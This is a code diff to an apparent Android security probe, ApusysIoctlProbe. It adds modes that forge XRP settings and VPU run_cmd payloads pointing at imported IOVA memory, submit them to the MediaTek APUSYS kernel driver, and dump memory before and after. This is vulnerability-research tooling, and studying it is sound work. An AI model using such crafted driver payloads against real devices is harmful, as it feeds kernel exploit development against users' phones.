@@ -48,6 +48,23 @@ public final class ApusysIoctlProbe {
     private static final int RUN_CMD_PAYLOAD_VPU_EXEC = 3;
     private static final int RUN_CMD_PAYLOAD_VPU_IOVA = 4;
 
+    private static final int XRP_SETTINGS_OFF = 0x000;
+    private static final int XRP_SETTINGS_LEN = 0x100;
+    private static final int XRP_CODE_OFF = 0x100;
+    private static final int XRP_CODE_SIZE = 0x00;
+    private static final int XRP_OUTPUT_OFF = 0x200;
+    private static final int XRP_OUTPUT_SIZE = 0x80;
+    private static final int XRP_DATA_DESC_OFF = 0x300;
+    private static final int XRP_DATA_DESC_SIZE = 0x0c;
+    private static final int XRP_DATA_PAYLOAD_OFF = 0x400;
+    private static final int XRP_DATA_PAYLOAD_SIZE = 0x80;
+    private static final byte[] XRP_CMD_MAGIC = new byte[] {
+        (byte) 0xde, 0x63, (byte) 0xdb, (byte) 0xbe,
+        0x4a, (byte) 0x99, 0x48, (byte) 0x89,
+        (byte) 0x90, (byte) 0x83, (byte) 0xf0, 0x7b,
+        (byte) 0xf8, 0x61, 0x09, 0x7a
+    };
+
     private ApusysIoctlProbe() {
     }
 
@@ -67,6 +84,8 @@ public final class ApusysIoctlProbe {
         boolean runCmdVpuExec = false;
         boolean runCmdVpuIova = false;
         boolean runCmdVpuIovaControl = false;
+        boolean runCmdVpuXrpIova = false;
+        boolean runCmdVpuXrpIovaControl = false;
         String ucmdKey = null;
         String ucmdKeyDump = null;
         for (String arg : args) {
@@ -100,6 +119,10 @@ public final class ApusysIoctlProbe {
                 runCmdVpuIova = true;
             } else if ("--run-cmd-vpu-iova-control".equals(arg)) {
                 runCmdVpuIovaControl = true;
+            } else if ("--run-cmd-vpu-xrp-iova".equals(arg)) {
+                runCmdVpuXrpIova = true;
+            } else if ("--run-cmd-vpu-xrp-iova-control".equals(arg)) {
+                runCmdVpuXrpIovaControl = true;
             } else if (arg.startsWith("--ucmd-key=")) {
                 ucmdKey = arg.substring("--ucmd-key=".length());
                 validateUcmdKey(ucmdKey);
@@ -116,6 +139,7 @@ public final class ApusysIoctlProbe {
                 || ucmdNegative || hardwareBuffer || ucmdHardwareBuffer
                 || runCmdHardwareBuffer || runCmdInvalidSc || runCmdVpuGuard
                 || runCmdVpuExec || runCmdVpuIova || runCmdVpuIovaControl
+                || runCmdVpuXrpIova || runCmdVpuXrpIovaControl
                 || ucmdKey != null || ucmdKeyDump != null) {
             System.out.println("[*] Mode: optional checks enabled;"
                 + " no secure alloc/free; some modes submit controlled"
@@ -209,11 +233,19 @@ public final class ApusysIoctlProbe {
             }
 
             if (runCmdVpuIova) {
-                runRunCmdVpuIovaHardwareBufferProbe(fd, true);
+                runRunCmdVpuIovaHardwareBufferProbe(fd, true, false);
             }
 
             if (runCmdVpuIovaControl) {
-                runRunCmdVpuIovaHardwareBufferProbe(fd, false);
+                runRunCmdVpuIovaHardwareBufferProbe(fd, false, false);
+            }
+
+            if (runCmdVpuXrpIova) {
+                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true);
+            }
+
+            if (runCmdVpuXrpIovaControl) {
+                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true);
             }
 
             if (ucmdKey != null) {
@@ -693,12 +725,19 @@ public final class ApusysIoctlProbe {
     }
 
     private static void runRunCmdVpuIovaHardwareBufferProbe(int apusysFd,
-                                                            boolean dispatch)
+                                                            boolean dispatch,
+                                                            boolean xrpSettings)
             throws Exception {
         System.out.println("\n[*] === Optional APUSYS run_cmd VPU IOVA chained probe ===");
-        System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
-            + " then the VPU request references that IOVA in libvpu-style"
-            + " settings and plane descriptors.");
+        if (xrpSettings) {
+            System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
+                + " writes a libneuron-style XRP settings buffer into that IOVA,"
+                + " then the VPU request references settings/output/data sections.");
+        } else {
+            System.out.println("[*] Mode: mem_create imports HardwareBuffer to get IOVA,"
+                + " then the VPU request references that IOVA in libvpu-style"
+                + " settings and plane descriptors.");
+        }
         if (!dispatch) {
             System.out.println("[*] Control: command buffer is imported but"
                 + " run_cmd_async is skipped before the original buffer dump.");
@@ -778,6 +817,17 @@ public final class ApusysIoctlProbe {
                 + " size=0x" + Integer.toHexString(iovaSize)
                 + " mem_id=0x" + Long.toHexString(memId));
 
+            if (xrpSettings) {
+                android.media.Image.Plane[] planes = output.getPlanes();
+                if (planes == null || planes.length == 0) {
+                    System.out.println("[-] original output image has no planes");
+                    return;
+                }
+                java.nio.ByteBuffer originalBuf = planes[0].getBuffer();
+                fillXrpSettingsBuffer(originalBuf, iovaLow, iovaSize);
+                dumpXrpWindows("before", originalBuf);
+            }
+
             // phase 4: now build a second HardwareBuffer with the VPU+IOVA payload.
             // Keep the first output/hardware buffer alive so its plane can be
             // dumped after execution; mem_create holds the kernel-side mapping.
@@ -785,8 +835,13 @@ public final class ApusysIoctlProbe {
             android.media.ImageWriter writer2
                 = android.media.ImageWriter.newInstance(reader2.getSurface(), 2);
             android.media.Image input2 = writer2.dequeueInputImage();
-            fillRunCmdVpuIova(input2, "apu_lib_apunn", "vpu_iova_apunn",
-                iovaLow, iovaSize);
+            if (xrpSettings) {
+                fillRunCmdVpuXrpIova(input2, "apu_lib_apunn",
+                    "vpu_xrp_iova_apunn", iovaLow, iovaSize);
+            } else {
+                fillRunCmdVpuIova(input2, "apu_lib_apunn", "vpu_iova_apunn",
+                    iovaLow, iovaSize);
+            }
             writer2.queueInputImage(input2);
 
             android.media.Image output2 = acquireImage(reader2);
@@ -848,6 +903,12 @@ public final class ApusysIoctlProbe {
                 return;
             }
             dumpU32Words("mem_create2_cmd_desc", cmdMemDesc, 0x38);
+            if (xrpSettings) {
+                android.media.Image.Plane[] cmdPlanes = output2.getPlanes();
+                if (cmdPlanes != null && cmdPlanes.length > 0) {
+                    dumpVpuCommandWindows("before", cmdPlanes[0].getBuffer());
+                }
+            }
 
             // run_cmd_async
             long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
@@ -874,7 +935,18 @@ public final class ApusysIoctlProbe {
                 android.media.Image.Plane[] planes = output.getPlanes();
                 if (planes != null && planes.length > 0) {
                     java.nio.ByteBuffer buf = planes[0].getBuffer();
-                    dumpByteBuffer("original_iova_buf", buf, 0x80);
+                    if (xrpSettings) {
+                        dumpXrpWindows("after", buf);
+                    } else {
+                        dumpByteBuffer("original_iova_buf", buf, 0x80);
+                    }
+                }
+            }
+            if (xrpSettings && output2 != null) {
+                android.media.Image.Plane[] cmdPlanes = output2.getPlanes();
+                if (cmdPlanes != null && cmdPlanes.length > 0) {
+                    System.out.println("[*] Dumping command buffer post-execution:");
+                    dumpVpuCommandWindows("after", cmdPlanes[0].getBuffer());
                 }
             }
 
@@ -1158,17 +1230,205 @@ public final class ApusysIoctlProbe {
             + " pixelStride=" + planes[0].getPixelStride());
     }
 
+    private static void fillRunCmdVpuXrpIova(android.media.Image image,
+                                             String algoName,
+                                             String label,
+                                             int iovaAddr,
+                                             int iovaSize) throws Exception {
+        android.media.Image.Plane[] planes = image.getPlanes();
+        if (planes == null || planes.length == 0) {
+            throw new IllegalStateException("input image has no planes");
+        }
+        java.nio.ByteBuffer buffer = planes[0].getBuffer();
+        int clearLen = buffer.capacity() < 0x2000 ? buffer.capacity() : 0x2000;
+        for (int i = 0; i < clearLen; i++) {
+            buffer.put(i, (byte) 0);
+        }
+
+        int requiredIovaBytes = XRP_DATA_PAYLOAD_OFF + XRP_DATA_PAYLOAD_SIZE;
+        if (iovaSize < requiredIovaBytes) {
+            throw new IllegalStateException("imported IOVA too small: need 0x"
+                + Integer.toHexString(requiredIovaBytes) + " have 0x"
+                + Integer.toHexString(iovaSize));
+        }
+
+        int codebufOffset = 0x60;
+        int codebufSize = 0xb70;
+        int totalNeeded = codebufOffset + codebufSize;
+        if (buffer.capacity() < totalNeeded) {
+            throw new IllegalStateException("input image too small: need 0x"
+                + Integer.toHexString(totalNeeded) + " have "
+                + buffer.capacity());
+        }
+
+        putU64LE(buffer, 0x00, 0x3d2070ece309c231L);
+        buffer.put(0x10, (byte) 1);
+        buffer.put(0x11, (byte) 0);
+        putU64LE(buffer, 0x18, 0);
+        putU32LE(buffer, 0x20, 1);
+        putU32LE(buffer, 0x24, 0x5c);
+        putU32LE(buffer, 0x28, 0x58);
+        putU32LE(buffer, 0x2c, 0x30);
+
+        int scOff = 0x30;
+        putU32LE(buffer, scOff + 0x00, 0x03);
+        putU32LE(buffer, scOff + 0x20, codebufSize);
+        putU32LE(buffer, scOff + 0x24, codebufOffset);
+        putU32LE(buffer, 0x58, 0);
+        putU32LE(buffer, 0x5c, 0);
+
+        int reqBase = codebufOffset;
+        byte[] nameBytes = algoName.getBytes("US-ASCII");
+        int nameLen = nameBytes.length < 0x1f ? nameBytes.length : 0x1f;
+        for (int i = 0; i < nameLen; i++) {
+            buffer.put(reqBase + 0x04 + i, nameBytes[i]);
+        }
+
+        buffer.put(reqBase + 0x35, (byte) 1);
+        putU32LE(buffer, reqBase + 0x38, XRP_SETTINGS_LEN);
+        putU64LE(buffer, reqBase + 0x40, iovaLow32(iovaAddr, XRP_SETTINGS_OFF));
+
+        int buf0 = reqBase + 0x50;
+        buffer.put(buf0 + 0x00, (byte) 0);
+        buffer.put(buf0 + 0x01, (byte) 0);
+        buffer.put(buf0 + 0x02, (byte) 1);
+        putU32LE(buffer, buf0 + 0x04, XRP_DATA_PAYLOAD_SIZE);
+        putU32LE(buffer, buf0 + 0x08, 0);
+        putU32LE(buffer, buf0 + 0x10, 0);
+        putU32LE(buffer, buf0 + 0x14, XRP_DATA_PAYLOAD_SIZE);
+        putU64LE(buffer, buf0 + 0x18,
+            iovaLow32(iovaAddr, XRP_DATA_PAYLOAD_OFF));
+
+        image.setTimestamp(System.nanoTime());
+        System.out.println("[+] input run_cmd " + label + " payload:"
+            + " magic=0x3d2070ece309c231 version=1 num_sc=1"
+            + " sc0_off=0x30 sc0_type=0x3"
+            + " cb_info_size=0x" + Integer.toHexString(codebufSize)
+            + " cb_info_off=0x" + Integer.toHexString(codebufOffset)
+            + " algo=" + algoName
+            + " req_buffer_count=1"
+            + " settings_iova=0x"
+            + Long.toHexString(iovaLow32(iovaAddr, XRP_SETTINGS_OFF))
+            + " settings_len=0x" + Integer.toHexString(XRP_SETTINGS_LEN)
+            + " output_iova=0x"
+            + Long.toHexString(iovaLow32(iovaAddr, XRP_OUTPUT_OFF))
+            + " data_desc_iova=0x"
+            + Long.toHexString(iovaLow32(iovaAddr, XRP_DATA_DESC_OFF))
+            + " plane0_mva=0x"
+            + Long.toHexString(iovaLow32(iovaAddr, XRP_DATA_PAYLOAD_OFF))
+            + " plane_count=" + planes.length
+            + " cap=" + buffer.capacity()
+            + " rowStride=" + planes[0].getRowStride()
+            + " pixelStride=" + planes[0].getPixelStride());
+    }
+
+    private static void fillXrpSettingsBuffer(java.nio.ByteBuffer buffer,
+                                              int iovaAddr,
+                                              int iovaSize) {
+        int required = XRP_DATA_PAYLOAD_OFF + XRP_DATA_PAYLOAD_SIZE;
+        if (buffer.capacity() < required) {
+            throw new IllegalStateException("settings image too small: need 0x"
+                + Integer.toHexString(required) + " have "
+                + buffer.capacity());
+        }
+        if (iovaSize < required) {
+            throw new IllegalStateException("imported IOVA too small: need 0x"
+                + Integer.toHexString(required) + " have 0x"
+                + Integer.toHexString(iovaSize));
+        }
+
+        int clearLen = buffer.capacity() < 0x800 ? buffer.capacity() : 0x800;
+        for (int i = 0; i < clearLen; i++) {
+            buffer.put(i, (byte) 0);
+        }
+
+        int s = XRP_SETTINGS_OFF;
+        putU32LE(buffer, s + 0x00, 4);
+        putU32LE(buffer, s + 0x04, XRP_CODE_SIZE);
+        putU32LE(buffer, s + 0x08, XRP_OUTPUT_SIZE);
+        putU32LE(buffer, s + 0x0c, XRP_DATA_DESC_SIZE);
+        putU32LE(buffer, s + 0x10, (int) iovaLow32(iovaAddr, XRP_CODE_OFF));
+        putU32LE(buffer, s + 0x20, (int) iovaLow32(iovaAddr, XRP_OUTPUT_OFF));
+        putU32LE(buffer, s + 0x30, (int) iovaLow32(iovaAddr, XRP_DATA_DESC_OFF));
+        for (int i = 0; i < XRP_CMD_MAGIC.length; i++) {
+            buffer.put(s + 0x40 + i, XRP_CMD_MAGIC[i]);
+        }
+        putU32LE(buffer, s + 0x50, 0);
+        putU32LE(buffer, s + 0x54, 0);
+
+        int out = XRP_OUTPUT_OFF;
+        putU32LE(buffer, out + 0x00, -1);
+        putU32LE(buffer, out + 0x04, 0x40);
+        putU32LE(buffer, out + 0x08, 4);
+        putU32LE(buffer, out + 0x0c, XRP_OUTPUT_SIZE);
+        putU32LE(buffer, out + 0x10, 0);
+
+        int data = XRP_DATA_DESC_OFF;
+        putU32LE(buffer, data + 0x00, 3);
+        putU32LE(buffer, data + 0x04, XRP_DATA_PAYLOAD_SIZE);
+        putU32LE(buffer, data + 0x08,
+            (int) iovaLow32(iovaAddr, XRP_DATA_PAYLOAD_OFF));
+
+        int payload = XRP_DATA_PAYLOAD_OFF;
+        for (int off = 0; off < XRP_DATA_PAYLOAD_SIZE; off += 4) {
+            putU32LE(buffer, payload + off, 0x41505530 + (off / 4));
+        }
+
+        System.out.println("[+] XRP settings buffer initialized:"
+            + " settings_off=0x" + Integer.toHexString(XRP_SETTINGS_OFF)
+            + " code_off=0x" + Integer.toHexString(XRP_CODE_OFF)
+            + " output_off=0x" + Integer.toHexString(XRP_OUTPUT_OFF)
+            + " data_desc_off=0x" + Integer.toHexString(XRP_DATA_DESC_OFF)
+            + " data_payload_off=0x" + Integer.toHexString(XRP_DATA_PAYLOAD_OFF)
+            + " base_iova=0x" + Integer.toHexString(iovaAddr));
+    }
+
+    private static long iovaLow32(int base, int off) {
+        return ((long) (base + off)) & 0xffffffffL;
+    }
+
+    private static void dumpXrpWindows(String phase, java.nio.ByteBuffer buf) {
+        dumpByteBufferRange("xrp_" + phase + "_settings",
+            buf, XRP_SETTINGS_OFF, 0x80);
+        dumpByteBufferRange("xrp_" + phase + "_output",
+            buf, XRP_OUTPUT_OFF, 0x80);
+        dumpByteBufferRange("xrp_" + phase + "_data_desc",
+            buf, XRP_DATA_DESC_OFF, 0x40);
+        dumpByteBufferRange("xrp_" + phase + "_data_payload",
+            buf, XRP_DATA_PAYLOAD_OFF, 0x80);
+    }
+
+    private static void dumpVpuCommandWindows(String phase,
+                                              java.nio.ByteBuffer buf) {
+        dumpByteBufferRange("vpu_cmd_" + phase + "_apusys_header",
+            buf, 0x00, 0x80);
+        dumpByteBufferRange("vpu_cmd_" + phase + "_request_head",
+            buf, 0x60, 0xc0);
+        dumpByteBufferRange("vpu_cmd_" + phase + "_request_tail",
+            buf, 0x60 + 0xb40, 0x30);
+    }
+
     private static void dumpByteBuffer(String name, java.nio.ByteBuffer buf,
                                         int len) {
-        int actual = buf.capacity() < len ? buf.capacity() : len;
+        dumpByteBufferRange(name, buf, 0, len);
+    }
+
+    private static void dumpByteBufferRange(String name, java.nio.ByteBuffer buf,
+                                            int off, int len) {
+        int start = off < 0 ? 0 : off;
+        int end = start + len;
+        if (end < start || end > buf.capacity()) {
+            end = buf.capacity();
+        }
         StringBuilder sb = new StringBuilder();
-        sb.append("    ").append(name).append(":");
-        for (int i = 0; i < actual; i += 4) {
+        sb.append("    ").append(name)
+          .append("[0x").append(Integer.toHexString(start)).append("]:");
+        for (int i = start; i + 3 < end; i += 4) {
             int val = (buf.get(i) & 0xff)
                 | ((buf.get(i + 1) & 0xff) << 8)
                 | ((buf.get(i + 2) & 0xff) << 16)
                 | ((buf.get(i + 3) & 0xff) << 24);
-            sb.append(" [").append(i).append("]=0x")
+            sb.append(" [").append(i - start).append("]=0x")
               .append(Integer.toHexString(val));
         }
         System.out.println(sb.toString());
